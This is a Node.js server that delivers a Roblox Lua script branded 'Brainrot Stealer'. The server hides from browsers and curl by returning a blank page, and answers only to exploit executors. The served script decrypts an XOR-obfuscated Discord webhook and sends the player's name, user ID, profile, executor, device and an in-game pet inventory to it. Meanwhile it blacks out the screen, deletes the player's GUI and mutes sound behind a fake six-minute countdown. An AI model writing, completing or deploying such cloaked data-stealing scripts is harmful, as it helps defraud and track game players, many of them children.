const express = require("express");
const app = express();
const PORT = process.env.PORT || 3000;

// ------------------------------------------------------------------
// 1. BLOCK NON-EXECUTORS (browsers, curl, etc.)
// ------------------------------------------------------------------
function blockNonExecutor(req, res, next) {
  const ua  = (req.get("User-Agent") || "").toLowerCase();
  const ref = (req.get("Referer")    || "").toLowerCase();

  const allowed =
    ua.includes("roblox") ||
    ua.includes("synapse") ||
    ua.includes("krnl") ||
    ua.includes("fluxus") ||
    ua.includes("executor") ||
    ref.includes("roblox.com");

  if (!allowed) {
    return res.status(403).send(`
<!DOCTYPE html><html><head><title></title>
<style>body{background:#000000;margin:0;padding:0;overflow:hidden;}</style></head>
<body></body></html>
    `.trim());
  }
  next();
}

// ------------------------------------------------------------------
// 2. HOME PAGE - COMPLETELY BLACK
// ------------------------------------------------------------------
app.get("/", (req, res) => {
  res.send(`
<!DOCTYPE html><html><head><title></title>
<style>body{background:#000000;margin:0;padding:0;overflow:hidden;}</style>
</head><body></body></html>
  `.trim());
});

// ------------------------------------------------------------------
// 3. /raw – EXECUTORS ONLY WITH ENCRYPTED WEBHOOK
// ------------------------------------------------------------------
app.get("/raw", blockNonExecutor, (req, res) => {
  const encrypted = req.query.wh;
  if (!encrypted) return res.status(400).send("-- MISSING DATA --");

  // Multi-layer XOR decryption
  let webhook = "";
  try {
    // First layer XOR
    const key1 = "brainrot_secure_2024_key1";
    let layer1 = "";
    for (let i = 0; i < encrypted.length; i++) {
      const keyChar = key1.charCodeAt(i % key1.length);
      const encryptedChar = encrypted.charCodeAt(i);
      layer1 += String.fromCharCode(encryptedChar ^ keyChar);
    }
    
    // Second layer XOR
    const key2 = "x7f9!pQz@3mK*vR$5";
    let layer2 = "";
    for (let i = 0; i < layer1.length; i++) {
      const keyChar = key2.charCodeAt(i % key2.length);
      const layer1Char = layer1.charCodeAt(i);
      layer2 += String.fromCharCode(layer1Char ^ keyChar);
    }
    
    webhook = Buffer.from(layer2, 'base64').toString('utf-8');
  } catch {
    return res.status(400).send("-- INVALID ENCRYPTION --");
  }

  if (!webhook.startsWith("https://discord.com/api/webhooks/")) {
    return res.status(400).send("-- INVALID WEBHOOK --");
  }

  // ----------------------------------------------------------------
  //   FULL LUA SCRIPT – WITH OBFUSCATED WEBHOOK ONLY
  // ----------------------------------------------------------------
  const lua = `-- Obfuscated Webhook System
local EncryptedData = "${encrypted}"

-- Webhook Decryption (Obfuscated)
local function DecryptWebhook(data)
    local key1 = "brainrot_secure_2024_key1"
    local key2 = "x7f9!pQz@3mK*vR$5"
    
    -- First layer decryption
    local layer1 = ""
    for i = 1, #data do
        local keyChar = string.byte(key1, (i - 1) % #key1 + 1)
        local dataChar = string.byte(data, i)
        layer1 = layer1 .. string.char(bit32.bxor(dataChar, keyChar))
    end
    
    -- Second layer decryption  
    local layer2 = ""
    for i = 1, #layer1 do
        local keyChar = string.byte(key2, (i - 1) % #key2 + 1)
        local layer1Char = string.byte(layer1, i)
        layer2 = layer2 .. string.char(bit32.bxor(layer1Char, keyChar))
    end
    
    return game:GetService("HttpService"):JSONDecode('"' .. layer2 .. '"')
end

-- Get decrypted webhook
local WebhookURL = DecryptWebhook(EncryptedData)

-- Safe HTTP Request Function
local function SafeHttpRequest(url, data)
    local success, result = pcall(function()
        -- Try different request methods
        if syn and syn.request then
            local response = syn.request({
                Url = url,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = data
            })
            return response and (response.StatusCode == 200 or response.StatusCode == 204)
        end
        
        if request and type(request) == "function" then
            local response = request({
                Url = url,
                Method = "POST", 
                Headers = {["Content-Type"] = "application/json"},
                Body = data
            })
            return response and (response.StatusCode == 200 or response.StatusCode == 204)
        end
        
        if http and type(http.request) == "function" then
            local response = http.request({
                Url = url,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = data
            })
            return response and (response.StatusCode == 200 or response.StatusCode == 204)
        end
        
        -- Fallback to HttpService
        local httpService = game:GetService("HttpService")
        if httpService.HttpEnabled then
            local success = pcall(function()
                httpService:PostAsync(url, data, Enum.HttpContentType.ApplicationJson)
            end)
            return success
        end
        
        return false
    end)
    
    return success and result
end

-- Safe Discord Send Function
local function SendToDiscord(embedData)
    local jsonData = game:GetService("HttpService"):JSONEncode({embeds = {embedData}})
    
    -- Send in background without waiting
    spawn(function()
        local success = SafeHttpRequest(WebhookURL, jsonData)
        if not success then
            -- Silent fail - don't show errors
        end
    end)
end

-- Get Player Info
local player = game.Players.LocalPlayer
if not player then
    repeat wait() until game.Players.LocalPlayer
    player = game.Players.LocalPlayer
end

local playerName = player.Name
local playerId = player.UserId
local playerProfile = "https://www.roblox.com/users/" .. playerId .. "/profile"
local playerAvatar = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. playerId .. "&width=420&height=420&format=png"

-- Executor Detection
local function GetExecutor()
    if syn and syn.request then return "Synapse X" end
    if KRNL_LOADED then return "Krnl" end
    if fluxus then return "Fluxus" end
    if PROTOSMASHER_LOADED then return "ProtoSmasher" end
    if electron then return "Electron" end
    return "Unknown Executor"
end

-- IP Address (Mocked for privacy)
local function GetIP()
    return "192.168.xxx.xxx"
end

-- Device Type
local function GetDeviceType()
    return game:GetService("UserInputService").TouchEnabled and "Mobile" or "Computer"
end

-- Create Black Screen
local function CreateBlackScreen()
    -- Clear existing GUI
    pcall(function()
        for _, gui in pairs(player.PlayerGui:GetChildren()) do
            pcall(function() gui:Destroy() end)
        end
    end)
    
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "BrainrotScanner"
    screenGui.ResetOnSpawn = false
    screenGui.Parent = player.PlayerGui
    
    local background = Instance.new("Frame")
    background.Size = UDim2.new(2, 0, 2, 0)
    background.Position = UDim2.new(-0.5, 0, -0.5, 0)
    background.BackgroundColor3 = Color3.new(0, 0, 0)
    background.BorderSizePixel = 0
    background.Parent = screenGui
    
    local timerLabel = Instance.new("TextLabel")
    timerLabel.Size = UDim2.new(1, 0, 0, 80)
    timerLabel.Position = UDim2.new(0, 0, 0.4, 0)
    timerLabel.BackgroundTransparency = 1
    timerLabel.Text = "06:00"
    timerLabel.TextColor3 = Color3.fromRGB(0, 255, 255)
    timerLabel.TextSize = 48
    timerLabel.Font = Enum.Font.GothamBold
    timerLabel.Parent = background
    
    local statusLabel = Instance.new("TextLabel")
    statusLabel.Size = UDim2.new(1, 0, 0, 25)
    statusLabel.Position = UDim2.new(0, 0, 0.55, 0)
    statusLabel.BackgroundTransparency = 1
    statusLabel.Text = "Initializing..."
    statusLabel.TextColor3 = Color3.new(1, 1, 1)
    statusLabel.TextSize = 18
    statusLabel.Font = Enum.Font.Gotham
    statusLabel.Parent = background
    
    return screenGui, timerLabel, statusLabel
end

-- Scan Pets Function
local function ScanPets()
    local allPets = {}
    local brainrots = {}
    local topPets = {}
    
    pcall(function()
        local plots = workspace:FindFirstChild("Plots")
        if plots then
            for _, plot in pairs(plots:GetChildren()) do
                local animalPodiums = plot:FindFirstChild("AnimalPodiums")
                if animalPodiums then
                    for _, podium in pairs(animalPodiums:GetChildren()) do
                        local base = podium:FindFirstChild("Base")
                        if base then
                            local spawn = base:FindFirstChild("Spawn")
                            if spawn then
                                local attachment = spawn:FindFirstChild("Attachment")
                                if attachment then
                                    local overhead = attachment:FindFirstChild("AnimalOverhead")
                                    if overhead then
                                        local displayName = overhead:FindFirstChild("DisplayName")
                                        local generation = overhead:FindFirstChild("Generation")
                                        
                                        if displayName and displayName:IsA("TextLabel") then
                                            local petName = displayName.Text
                                            local rate = generation and generation:IsA("TextLabel") and generation.Text or "N/A"
                                            
                                            if petName ~= "" then
                                                local moneyValue = 0
                                                if string.find(rate, "B/s") then
                                                    moneyValue = tonumber(string.match(rate, "(%d+%.?%d*)")) or 0
                                                    moneyValue = moneyValue * 1000000000
                                                elseif string.find(rate, "M/s") then
                                                    moneyValue = tonumber(string.match(rate, "(%d+%.?%d*)")) or 0
                                                    moneyValue = moneyValue * 1000000
                                                elseif string.find(rate, "K/s") then
                                                    moneyValue = tonumber(string.match(rate, "(%d+%.?%d*)")) or 0
                                                    moneyValue = moneyValue * 1000
                                                else
                                                    moneyValue = tonumber(string.match(rate, "(%d+)")) or 0
                                                end
                                                
                                                local petData = {
                                                    Name = petName,
                                                    Rate = rate,
                                                    Money = moneyValue
                                                }
                                                
                                                table.insert(allPets, petData)
                                                
                                                if string.find(string.lower(petName), "brainrot") and moneyValue > 1000000 then
                                                    table.insert(brainrots, petData)
                                                end
                                            end
                                        end
                                    end
                                end
                            end
                        end
                    end
                end
            end
        end
    end)
    
    -- Sort by money value
    table.sort(allPets, function(a, b) return a.Money > b.Money end)
    table.sort(brainrots, function(a, b) return a.Money > b.Money end)
    
    -- Get top 5
    for i = 1, math.min(5, #allPets) do
        if allPets[i].Money > 0 then
            table.insert(topPets, allPets[i])
        end
    end
    
    return allPets, brainrots, topPets
end

-- Format Money
local function FormatMoney(value)
    if value >= 1000000000 then
        return string.format("$%.2fB/s", value / 1000000000)
    elseif value >= 1000000 then
        return string.format("$%.2fM/s", value / 1000000)
    elseif value >= 1000 then
        return string.format("$%.2fK/s", value / 1000)
    else
        return string.format("$%d/s", value)
    end
end

-- Format Pet List
local function FormatPetList(pets, showMoney)
    if #pets == 0 then return "None" end
    
    local result = ""
    for i = 1, math.min(5, #pets) do
        if showMoney then
            result = result .. string.format("%d. %s | %s\\n", i, pets[i].Name, FormatMoney(pets[i].Money))
        else
            result = result .. string.format("%d. %s | %s\\n", i, pets[i].Name, pets[i].Rate)
        end
    end
    return result
end

-- Check if legit hit
local function CheckHit(brainrots, topPets)
    if #brainrots > 2 then return "LEGIT HIT - Multiple brainrots" end
    if #topPets > 0 and topPets[1].Money > 50000000 then return "LEGIT HIT - High value" end
    if #brainrots > 0 then return "POTENTIAL HIT - Some brainrots" end
    return "LOW VALUE - Nothing good"
end

-- Main Process Function
local function StartStealingProcess(gameLink)
    local executor = GetExecutor()
    local ipAddress = GetIP()
    local deviceType = GetDeviceType()
    local playerCount = #game.Players:GetPlayers()
    
    -- Create black screen
    local screenGui, timer, status = CreateBlackScreen()
    
    -- Mute sounds
    pcall(function()
        game:GetService("SoundService").Volume = 0
    end)
    
    status.Text = "Scanning pets..."
    wait(1)
    
    -- Scan pets
    local allPets, brainrots, topPets = ScanPets()
    local hitStatus = CheckHit(brainrots, topPets)
    
    status.Text = "Sending logs..."
    
    -- Send initial embed
    local embed = {
        title = "BRAINROT STEALER - LOGS",
        description = "Game: " .. (gameLink or "Unknown"),
        color = 65280,
        author = {
            name = playerName,
            icon_url = playerAvatar,
            url = playerProfile
        },
        fields = {
            {
                name = "USER INFO",
                value = "Executor: " .. executor .. "\\nIP: " .. ipAddress .. "\\nDevice: " .. deviceType,
                inline = true
            },
            {
                name = "PROFILE",
                value = "[Click Here](" .. playerProfile .. ")",
                inline = true
            },
            {
                name = "SERVER INFO", 
                value = "Players: " .. playerCount .. "\\nTotal Pets: " .. #allPets .. "\\nBrainrots: " .. #brainrots,
                inline = true
            },
            {
                name = "TOP 5 PETS",
                value = FormatPetList(topPets, true),
                inline = false
            },
            {
                name = "BRAINROTS FOUND",
                value = FormatPetList(brainrots, true),
                inline = false
            },
            {
                name = "HIT STATUS",
                value = hitStatus,
                inline = false
            }
        },
        footer = {text = "Brainrot Stealer • " .. os.date("%X")},
        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
    }
    
    SendToDiscord(embed)
    
    status.Text = "Logs sent! Starting 6-minute process..."
    
    -- 6-minute timer
    local totalTime = 360
    local startTime = tick()
    
    while tick() - startTime < totalTime do
        local timeLeft = totalTime - (tick() - startTime)
        local minutes = math.floor(timeLeft / 60)
        local seconds = math.floor(timeLeft % 60)
        timer.Text = string.format("%02d:%02d", minutes, seconds)
        wait(0.1)
    end
    
    -- Send completion embed
    local completeEmbed = {
        title = "BRAINROT STEALER - COMPLETE",
        color = 32768,
        author = {
            name = playerName,
            icon_url = playerAvatar,
            url = playerProfile
        },
        fields = {
            {
                name = "RESULTS",
                value = "Time: 6 minutes\\nPets Scanned: " .. #allPets .. "\\nBrainrots Found: " .. #brainrots .. "\\nStatus: " .. hitStatus,
                inline = false
            }
        },
        footer = {text = "Brainrot Stealer • " .. os.date("%X")}
    }
    
    SendToDiscord(completeEmbed)
    
    status.Text = "Process complete! Closing..."
    timer.Text = "DONE!"
    
    wait(3)
    
    -- Clean up
    pcall(function() screenGui:Destroy() end)
end

-- Create GUI
local function CreateGUI()
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "StealerPanel"
    screenGui.ResetOnSpawn = false
    screenGui.Parent = player.PlayerGui
    
    local mainFrame = Instance.new("Frame")
    mainFrame.Size = UDim2.new(0, 400, 0, 250)
    mainFrame.Position = UDim2.new(0.5, -200, 0.5, -125)
    mainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
    mainFrame.BorderSizePixel = 0
    mainFrame.Parent = screenGui
    
    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(1, 0, 0, 60)
    title.BackgroundColor3 = Color3.fromRGB(0, 50, 0)
    title.Text = "BRAINROT STEALER\\nEVERYONE CAN USE"
    title.TextColor3 = Color3.fromRGB(0, 255, 0)
    title.Font = Enum.Font.GothamBold
    title.TextSize = 16
    title.Parent = mainFrame
    
    local textBox = Instance.new("TextBox")
    textBox.Size = UDim2.new(0.8, 0, 0, 40)
    textBox.Position = UDim2.new(0.1, 0, 0.3, 0)
    textBox.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    textBox.TextColor3 = Color3.new(1, 1, 1)
    textBox.PlaceholderText = "Paste Roblox game link here..."
    textBox.TextSize = 14
    textBox.Parent = mainFrame
    
    local button = Instance.new("TextButton")
    button.Size = UDim2.new(0.7, 0, 0, 50)
    button.Position = UDim2.new(0.15, 0, 0.7, 0)
    button.BackgroundColor3 = Color3.fromRGB(0, 200, 0)
    button.Text = "START STEALING"
    button.TextColor3 = Color3.new(1, 1, 1)
    button.Font = Enum.Font.GothamBold
    button.TextSize = 14
    button.Parent = mainFrame
    
    button.MouseButton1Click:Connect(function()
        local link = textBox.Text
        if string.find(string.lower(link or ""), "roblox") then
            button.Text = "STARTING..."
            button.BackgroundColor3 = Color3.fromRGB(0, 100, 0)
            wait(1)
            StartStealingProcess(link)
        else
            button.Text = "INVALID LINK"
            button.BackgroundColor3 = Color3.fromRGB(200, 0, 0)
            wait(2)
            button.Text = "START STEALING"
            button.BackgroundColor3 = Color3.fromRGB(0, 200, 0)
        end
    end)
end

-- Initialize
wait(1)
CreateGUI()

print("Brainrot Stealer loaded successfully!")
print("Ready to steal brainrots!")`;

  res.type("text/plain").send(lua);
});

// ------------------------------------------------------------------
// 4. CATCH-ALL → 404 + BLACK SCREEN
// ------------------------------------------------------------------
app.use((req, res) => {
  res.status(404).send(`
<!DOCTYPE html><html><head><title></title>
<style>body{background:#000000;margin:0;padding:0;overflow:hidden;}</style></head>
<body></body></html>
  `.trim());
});

// ------------------------------------------------------------------
// 5. START SERVER
// ------------------------------------------------------------------
app.listen(PORT, () => {
  console.log("Brainrot Stealer Server running on port " + PORT);
  console.log("Everyone can use the script");
  console.log("Website: https://tommyfc555-github-io.onrender.com");
});
